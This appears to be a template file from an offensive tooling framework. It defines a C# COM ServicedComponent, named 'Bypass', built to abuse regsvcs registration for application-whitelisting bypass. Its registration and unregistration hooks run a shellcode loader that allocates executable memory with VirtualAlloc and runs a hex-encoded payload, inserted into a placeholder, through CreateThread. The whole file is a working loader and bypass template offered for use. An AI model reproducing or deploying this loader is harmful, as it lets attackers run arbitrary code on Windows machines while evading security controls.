[ShellCode]
value: notSet
process: hexEncode

[Template]
data: using System;
  using System.EnterpriseServices;
  using System.Runtime.InteropServices;

  namespace regsvcser
  {

      public class Bypass : ServicedComponent
      {
          public Bypass() { Console.WriteLine("I am a basic COM Object"); }

          [ComRegisterFunction] //This executes if registration is successful
          public static void RegisterClass ( string key )
          {
              Console.WriteLine("I shouldn't really execute");
              Shellcode.Exec();
          }

          [ComUnregisterFunction] //This executes if registration fails
          public static void UnRegisterClass ( string key )
          {
              Console.WriteLine("I shouldn't really execute either.");
              Shellcode.Exec();
          }
      }

      public class Shellcode
      {
          public static void Exec()
          {
              // native function's compiled code
              // generated with metasploit
              // executes calc.exe
              byte[] shellcode = new byte[] { ${ShellCode:value} };



              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                  MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              // prepare data


              IntPtr pinfo = IntPtr.Zero;

              // execute native code

              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return;
          }

          private static UInt32 MEM_COMMIT = 0x1000;

          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

          [DllImport("kernel32")]
          private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
               UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


          [DllImport("kernel32")]
          private static extern IntPtr CreateThread(

            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId

            );

          [DllImport("kernel32")]
          private static extern UInt32 WaitForSingleObject(

            IntPtr hHandle,
            UInt32 dwMilliseconds
            );


      }

  }
